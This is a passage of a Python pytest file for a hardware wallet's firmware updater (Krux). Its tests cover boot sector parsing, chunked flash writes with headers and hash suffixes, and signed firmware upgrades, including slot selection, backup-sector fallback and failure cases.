0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n        0x00,\n    ]\n\n    TEST_SECTOR_CASES = [\n        [(FIRMWARE_SLOT_1, 1744896, 1), SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1],\n        [(FIRMWARE_SLOT_2, 1744896, 1), SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2],\n        [(None, None, None), SECTOR_WITH_NO_ACTIVE_FIRMWARE],\n    ]\n\n    return namedtuple(\n        \"TestData\",\n        [\n            \"TEST_SIGNER_PUBKEY\",\n            \"TEST_SIGNER_PUBLIC_KEY\",\n            \"TEST_FIRMWARE_FILENAME\",\n            \"TEST_FIRMWARE\",\n            \"TEST_FIRMWARE_SHA256\",\n            \"TEST_FIRMWARE_WITH_HEADER_SHA256\",\n            \"TEST_FIRMWARE_SIG\",\n            \"TEST_FIRMWARE_SIGNATURE\",\n            \"TEST_FIRMWARE_MALFORMED_SIG\",\n            \"TEST_FIRMWARE_BAD_SIG\",\n            \"SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1\",\n            \"SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2\",\n            \"SECTOR_WITH_NO_ACTIVE_FIRMWARE\",\n            \"TEST_SECTOR_CASES\",\n        ],\n    )(\n        TEST_SIGNER_PUBKEY,\n        TEST_SIGNER_PUBLIC_KEY,\n        TEST_FIRMWARE_FILENAME,\n        TEST_FIRMWARE,\n        TEST_FIRMWARE_SHA256,\n        TEST_FIRMWARE_WITH_HEADER_SHA256,\n        TEST_FIRMWARE_SIG,\n        TEST_FIRMWARE_SIGNATURE,\n        TEST_FIRMWARE_MALFORMED_SIG,\n        TEST_FIRMWARE_BAD_SIG,\n        SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1,\n        SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2,\n        SECTOR_WITH_NO_ACTIVE_FIRMWARE,\n        TEST_SECTOR_CASES,\n    )\n\n\n@pytest.fixture\ndef mock_success_input_cls(mocker):\n    class MockSuccessInput(mocker.MagicMock):\n        def wait_for_button(self):\n            from krux.input import BUTTON_ENTER\n\n            return BUTTON_ENTER\n\n    return MockSuccessInput\n\n\n@pytest.fixture\ndef mock_fail_input_cls(mocker):\n    class MockFailInput(mocker.MagicMock):\n        def wait_for_button(self):\n            from krux.input import BUTTON_PAGE\n\n            return BUTTON_PAGE\n\n    return MockFailInput\n\n\ndef test_find_active_firmware(mocker, m5stickv, tdata):\n    from krux.firmware import find_active_firmware\n\n    for test_sector_case in tdata.TEST_SECTOR_CASES:\n        address, size, i = find_active_firmware(test_sector_case[1])\n        assert address == test_sector_case[0][0]\n        assert size == test_sector_case[0][1]\n        assert i == test_sector_case[0][2]\n\n\ndef test_update_boot_config_sector(mocker, m5stickv, tdata):\n    from krux.firmware import update_boot_config_sector, FIRMWARE_SLOT_2\n\n    before_sector = tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE\n    for i in range(8):\n        after_sector = update_boot_config_sector(\n            before_sector, i, FIRMWARE_SLOT_2, 1653985\n        )\n        assert after_sector[i * 32 : i * 32 + 4] != before_sector[i * 32 : i * 32 + 4]\n        assert (\n            after_sector[i * 32 + 4 : i * 32 + 4 + 4]\n            != before_sector[i * 32 + 4 : i * 32 + 4 + 4]\n        )\n        assert (\n            after_sector[i * 32 + 8 : i * 32 + 8 + 4]\n            != before_sector[i * 32 + 8 : i * 32 + 8 + 4]\n        )\n        assert after_sector[i * 32 : i * 32 + 4] == (0x5AA5D0C0 | 0b1101).to_bytes(\n            4, \"big\"\n        )\n        assert after_sector[i * 32 + 4 : i * 32 + 4 + 4] == FIRMWARE_SLOT_2.to_bytes(\n            4, \"big\"\n        )\n        assert after_sector[i * 32 + 8 : i * 32 + 8 + 4] == (1653985).to_bytes(4, \"big\")\n\n\ndef test_fsize(mocker, m5stickv, tdata):\n    from krux.firmware import fsize\n\n    expected_size = len(open(tdata.TEST_FIRMWARE_FILENAME, \"rb\").read())\n    assert fsize(tdata.TEST_FIRMWARE_FILENAME) == expected_size\n\n\ndef test_sha256(mocker, m5stickv, tdata):\n    import hashlib\n    from krux.firmware import sha256\n\n    firmware = open(tdata.TEST_FIRMWARE_FILENAME, \"rb\").read()\n    size = len(firmware)\n    expected_hash = hashlib.sha256(b\"\\x00\" + size.to_bytes(4, \"little\") + firmware)\n    assert sha256(tdata.TEST_FIRMWARE_FILENAME, size) == expected_hash.digest()\n\n\ndef test_write_data_with_header_and_sha_suffix(mocker, m5stickv, tdata):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    import hashlib\n    import io\n    import krux\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n    header = b\"\\x00\" + size.to_bytes(4, \"little\")\n    hash = hashlib.sha256(header + data).digest()\n\n    write_data(\n        percent_callback,\n        FIRMWARE_SLOT_1,\n        io.BytesIO(data),\n        size,\n        1024,\n        header=True,\n        sha_suffix=hash,\n    )\n\n    assert num_callbacks == 6\n    krux.firmware.flash.erase.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 3072, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 4096, 1024),\n        ]\n    )\n    krux.firmware.flash.write.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, header),\n            mocker.call(FIRMWARE_SLOT_1 + 5, data[: 1024 - 5]),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, data[1024 - 5 : 1024 - 5 + 1024]),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 2048, data[1024 - 5 + 1024 : 1024 - 5 + 2 * 1024]\n            ),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 3072, data[1024 - 5 + 2 * 1024 : 1024 - 5 + 3 * 1024]\n            ),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 4096,\n                data[1024 - 5 + 3 * 1024 :] + hash + (b\"\\x00\" * (1024 - 5 - len(hash))),\n            ),\n        ]\n    )\n\n\ndef test_write_data_with_header_and_no_sha_suffix(mocker, m5stickv, tdata):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    import io\n    import krux\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n    header = b\"\\x00\" + size.to_bytes(4, \"little\")\n\n    write_data(\n        percent_callback,\n        FIRMWARE_SLOT_1,\n        io.BytesIO(data),\n        size,\n        1024,\n        header=True,\n        sha_suffix=None,\n    )\n\n    assert num_callbacks == 6\n    krux.firmware.flash.erase.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 3072, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 4096, 1024),\n        ]\n    )\n    krux.firmware.flash.write.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, header),\n            mocker.call(FIRMWARE_SLOT_1 + 5, data[: 1024 - 5]),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, data[1024 - 5 : 1024 - 5 + 1024]),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 2048, data[1024 - 5 + 1024 : 1024 - 5 + 2 * 1024]\n            ),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 3072, data[1024 - 5 + 2 * 1024 : 1024 - 5 + 3 * 1024]\n            ),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 4096,\n                data[1024 - 5 + 3 * 1024 :] + (b\"\\x00\" * (1024 - 5)),\n            ),\n        ]\n    )\n\n\ndef test_write_data_with_no_header_and_sha_suffix(mocker, m5stickv, tdata):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    import hashlib\n    import io\n    import krux\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n    header = b\"\\x00\" + size.to_bytes(4, \"little\")\n    hash = hashlib.sha256(header + data).digest()\n\n    write_data(\n        percent_callback,\n        FIRMWARE_SLOT_1,\n        io.BytesIO(data),\n        size,\n        1024,\n        header=False,\n        sha_suffix=hash,\n    )\n\n    assert num_callbacks == 6\n    krux.firmware.flash.erase.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 3072, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 4096, 1024),\n        ]\n    )\n    krux.firmware.flash.write.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, data[:1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, data[1024 : 1024 + 1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, data[1024 + 1024 : 1024 + 2 * 1024]),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 3072, data[1024 + 2 * 1024 : 1024 + 3 * 1024]\n            ),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 4096,\n                data[1024 + 3 * 1024 :] + hash + (b\"\\x00\" * (1024 - len(hash))),\n            ),\n        ]\n    )\n\n\ndef test_write_data_with_no_header_and_no_sha_suffix(mocker, m5stickv, tdata):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    import io\n    import krux\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n\n    write_data(\n        percent_callback,\n        FIRMWARE_SLOT_1,\n        io.BytesIO(data),\n        size,\n        1024,\n        header=False,\n        sha_suffix=None,\n    )\n\n    assert num_callbacks == 5\n    krux.firmware.flash.erase.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 3072, 1024),\n        ]\n    )\n    krux.firmware.flash.write.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, data[:1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, data[1024 : 1024 + 1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, data[1024 + 1024 : 1024 + 2 * 1024]),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 3072, data[1024 + 2 * 1024 : 1024 + 3 * 1024]\n            ),\n        ]\n    )\n\n\ndef test_write_data_with_1_small_read(mocker, m5stickv, tdata):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    import io\n    import krux\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    class BadReader(io.BytesIO):\n        calls = 0\n\n        def read(self, num_bytes):\n            if BadReader.calls == 0:\n                BadReader.calls += 1\n                num_bytes = 1\n            return super().read(num_bytes)\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n\n    write_data(\n        percent_callback,\n        FIRMWARE_SLOT_1,\n        BadReader(data),\n        size,\n        1024,\n        header=False,\n        sha_suffix=None,\n    )\n\n    assert num_callbacks == 6\n    krux.firmware.flash.erase.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 3072, 1024),\n        ]\n    )\n    krux.firmware.flash.write.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, data[:1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, data[1024 : 1024 + 1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, data[1024 + 1024 : 1024 + 2 * 1024]),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 3072, data[1024 + 2 * 1024 : 1024 + 3 * 1024]\n            ),\n        ]\n    )\n\n\ndef test_write_data_with_1_failed_read(mocker, m5stickv, tdata):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    import io\n    import krux\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    class BadReader(io.BytesIO):\n        calls = 0\n\n        def read(self, num_bytes):\n            if BadReader.calls == 0:\n                BadReader.calls += 1\n                return bytes(0)\n            return super().read(num_bytes)\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n\n    write_data(\n        percent_callback,\n        FIRMWARE_SLOT_1,\n        BadReader(data),\n        size,\n        1024,\n        header=False,\n        sha_suffix=None,\n    )\n\n    assert num_callbacks == 6\n    krux.firmware.flash.erase.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, 1024),\n            mocker.call(FIRMWARE_SLOT_1 + 3072, 1024),\n        ]\n    )\n    krux.firmware.flash.write.assert_has_calls(\n        [\n            mocker.call(FIRMWARE_SLOT_1, data[:1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 1024, data[1024 : 1024 + 1024]),\n            mocker.call(FIRMWARE_SLOT_1 + 2048, data[1024 + 1024 : 1024 + 2 * 1024]),\n            mocker.call(\n                FIRMWARE_SLOT_1 + 3072, data[1024 + 2 * 1024 : 1024 + 3 * 1024]\n            ),\n        ]\n    )\n\n\ndef test_write_data_with_5_failed_read(mocker, m5stickv, tdata):\n    import io\n    from krux.firmware import write_data, FIRMWARE_SLOT_1\n\n    num_callbacks = 0\n\n    def percent_callback(pct):\n        nonlocal num_callbacks\n        num_callbacks += 1\n\n    class BadReader(io.BytesIO):\n        calls = 0\n\n        def read(self, num_bytes):\n            if BadReader.calls <= 5:\n                BadReader.calls += 1\n                return bytes(0)\n            return super().read(num_bytes)\n\n    data = bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)\n    size = len(data)\n\n    with pytest.raises(ValueError):\n        write_data(\n            percent_callback,\n            FIRMWARE_SLOT_1,\n            BadReader(data),\n            size,\n            1024,\n            header=False,\n            sha_suffix=None,\n        )\n\n    assert num_callbacks == 6\n\n\ndef test_upgrade(mocker, m5stickv, mock_success_input_cls, tdata):\n    import binascii\n    from embit import ec\n\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    mocker.patch(\n        \"krux.firmware.flash.read\",\n        new=mocker.MagicMock(\n            return_value=bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1)\n        ),\n    )\n    mocker.patch(\"krux.firmware.ec\", new=mocker.MagicMock(wraps=ec))\n    mocker.spy(tdata.TEST_SIGNER_PUBLIC_KEY, \"verify\")\n    mocker.patch(\n        \"krux.firmware.ec.PublicKey.from_string\",\n        new=mocker.MagicMock(return_value=tdata.TEST_SIGNER_PUBLIC_KEY),\n    )\n    import krux\n    from krux import firmware\n\n    mocker.spy(firmware, \"write_data\")\n    mocker.spy(firmware, \"update_boot_config_sector\")\n\n    assert firmware.upgrade()\n\n    krux.firmware.ec.PublicKey.from_string.assert_called_with(tdata.TEST_SIGNER_PUBKEY)\n    krux.firmware.ec.Signature.parse.assert_called_with(tdata.TEST_FIRMWARE_SIG)\n    tdata.TEST_SIGNER_PUBLIC_KEY.verify.assert_called_with(\n        tdata.TEST_FIRMWARE_SIGNATURE,\n        binascii.unhexlify(tdata.TEST_FIRMWARE_SHA256),\n    )\n    assert tdata.TEST_SIGNER_PUBLIC_KEY.verify(\n        tdata.TEST_FIRMWARE_SIGNATURE,\n        binascii.unhexlify(tdata.TEST_FIRMWARE_SHA256),\n    )\n\n    krux.firmware.flash.read.assert_called_with(\n        firmware.MAIN_BOOT_CONFIG_SECTOR_ADDRESS, 4096\n    )\n\n    firmware.update_boot_config_sector.assert_called_with(\n        bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1),\n        1,\n        firmware.FIRMWARE_SLOT_2,\n        len(tdata.TEST_FIRMWARE),\n    )\n\n    firmware.write_data.assert_has_calls(\n        [\n            mocker.call(\n                mocker.ANY,\n                firmware.FIRMWARE_SLOT_2,\n                mocker.ANY,\n                len(tdata.TEST_FIRMWARE),\n                65536,\n                True,\n                binascii.unhexlify(tdata.TEST_FIRMWARE_WITH_HEADER_SHA256),\n            ),\n            mocker.call(\n                mocker.ANY,\n                firmware.BACKUP_BOOT_CONFIG_SECTOR_ADDRESS,\n                mocker.ANY,\n                len(bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1)),\n                4096,\n            ),\n            mocker.call(\n                mocker.ANY,\n                firmware.MAIN_BOOT_CONFIG_SECTOR_ADDRESS,\n                mocker.ANY,\n                len(bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1)),\n                4096,\n            ),\n        ]\n    )\n\n\ndef test_upgrade_uses_backup_sector_when_main_sector_is_missing_active_firmware(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    import binascii\n    from embit import ec\n\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    mocker.patch(\n        \"krux.firmware.flash.read\",\n        new=mocker.MagicMock(\n            side_effect=[\n                bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE),\n                bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1),\n            ]\n        ),\n    )\n    mocker.patch(\"krux.firmware.ec\", new=mocker.MagicMock(wraps=ec))\n    mocker.spy(tdata.TEST_SIGNER_PUBLIC_KEY, \"verify\")\n    mocker.patch(\n        \"krux.firmware.ec.PublicKey.from_string\",\n        new=mocker.MagicMock(return_value=tdata.TEST_SIGNER_PUBLIC_KEY),\n    )\n    import krux\n    from krux import firmware\n\n    mocker.spy(firmware, \"write_data\")\n    mocker.spy(firmware, \"update_boot_config_sector\")\n\n    assert firmware.upgrade()\n\n    krux.firmware.ec.PublicKey.from_string.assert_called_with(tdata.TEST_SIGNER_PUBKEY)\n    krux.firmware.ec.Signature.parse.assert_called_with(tdata.TEST_FIRMWARE_SIG)\n    tdata.TEST_SIGNER_PUBLIC_KEY.verify.assert_called_with(\n        tdata.TEST_FIRMWARE_SIGNATURE,\n        binascii.unhexlify(tdata.TEST_FIRMWARE_SHA256),\n    )\n    assert tdata.TEST_SIGNER_PUBLIC_KEY.verify(\n        tdata.TEST_FIRMWARE_SIGNATURE,\n        binascii.unhexlify(tdata.TEST_FIRMWARE_SHA256),\n    )\n\n    krux.firmware.flash.read.assert_has_calls(\n        [\n            mocker.call(firmware.MAIN_BOOT_CONFIG_SECTOR_ADDRESS, 4096),\n            mocker.call(firmware.BACKUP_BOOT_CONFIG_SECTOR_ADDRESS, 4096),\n        ]\n    )\n\n    firmware.update_boot_config_sector.assert_called_with(\n        bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_1),\n        1,\n        firmware.FIRMWARE_SLOT_2,\n        len(tdata.TEST_FIRMWARE),\n    )\n\n    firmware.write_data.assert_has_calls(\n        [\n            mocker.call(\n                mocker.ANY,\n                firmware.FIRMWARE_SLOT_2,\n                mocker.ANY,\n                len(tdata.TEST_FIRMWARE),\n                65536,\n                True,\n                binascii.unhexlify(tdata.TEST_FIRMWARE_WITH_HEADER_SHA256),\n            ),\n            mocker.call(\n                mocker.ANY,\n                firmware.BACKUP_BOOT_CONFIG_SECTOR_ADDRESS,\n                mocker.ANY,\n                len(bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)),\n                4096,\n            ),\n            mocker.call(\n                mocker.ANY,\n                firmware.MAIN_BOOT_CONFIG_SECTOR_ADDRESS,\n                mocker.ANY,\n                len(bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)),\n                4096,\n            ),\n        ]\n    )\n\n\ndef test_upgrade_uses_slot_1_when_firmware_is_in_slot_2(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    import binascii\n    from embit import ec\n\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    mocker.patch(\n        \"krux.firmware.flash.read\",\n        new=mocker.MagicMock(\n            return_value=bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2)\n        ),\n    )\n    mocker.patch(\"krux.firmware.ec\", new=mocker.MagicMock(wraps=ec))\n    mocker.spy(tdata.TEST_SIGNER_PUBLIC_KEY, \"verify\")\n    mocker.patch(\n        \"krux.firmware.ec.PublicKey.from_string\",\n        new=mocker.MagicMock(return_value=tdata.TEST_SIGNER_PUBLIC_KEY),\n    )\n    import krux\n    from krux import firmware\n\n    mocker.spy(firmware, \"write_data\")\n    mocker.spy(firmware, \"update_boot_config_sector\")\n\n    assert firmware.upgrade()\n\n    krux.firmware.ec.PublicKey.from_string.assert_called_with(tdata.TEST_SIGNER_PUBKEY)\n    krux.firmware.ec.Signature.parse.assert_called_with(tdata.TEST_FIRMWARE_SIG)\n    tdata.TEST_SIGNER_PUBLIC_KEY.verify.assert_called_with(\n        tdata.TEST_FIRMWARE_SIGNATURE,\n        binascii.unhexlify(tdata.TEST_FIRMWARE_SHA256),\n    )\n    assert tdata.TEST_SIGNER_PUBLIC_KEY.verify(\n        tdata.TEST_FIRMWARE_SIGNATURE,\n        binascii.unhexlify(tdata.TEST_FIRMWARE_SHA256),\n    )\n\n    krux.firmware.flash.read.assert_called_with(\n        firmware.MAIN_BOOT_CONFIG_SECTOR_ADDRESS, 4096\n    )\n\n    firmware.update_boot_config_sector.assert_called_with(\n        bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2),\n        1,\n        firmware.FIRMWARE_SLOT_1,\n        len(tdata.TEST_FIRMWARE),\n    )\n\n    firmware.write_data.assert_has_calls(\n        [\n            mocker.call(\n                mocker.ANY,\n                firmware.FIRMWARE_SLOT_1,\n                mocker.ANY,\n                len(tdata.TEST_FIRMWARE),\n                65536,\n                True,\n                binascii.unhexlify(tdata.TEST_FIRMWARE_WITH_HEADER_SHA256),\n            ),\n            mocker.call(\n                mocker.ANY,\n                firmware.BACKUP_BOOT_CONFIG_SECTOR_ADDRESS,\n                mocker.ANY,\n                len(bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2)),\n                4096,\n            ),\n            mocker.call(\n                mocker.ANY,\n                firmware.MAIN_BOOT_CONFIG_SECTOR_ADDRESS,\n                mocker.ANY,\n                len(bytes(tdata.SECTOR_WITH_ACTIVE_FIRMWARE_AT_INDEX_1_SLOT_2)),\n                4096,\n            ),\n        ]\n    )\n\n\ndef test_upgrade_fails_when_sd_card_not_present(mocker, m5stickv):\n    mocker.patch(\"os.listdir\", new=mocker.MagicMock(side_effect=Exception))\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_firmware_files_not_present(mocker, m5stickv):\n    mocker.patch(\"os.listdir\", new=mocker.MagicMock(return_value=[\"file1\"]))\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_user_declines(mocker, m5stickv, mock_fail_input_cls, tdata):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    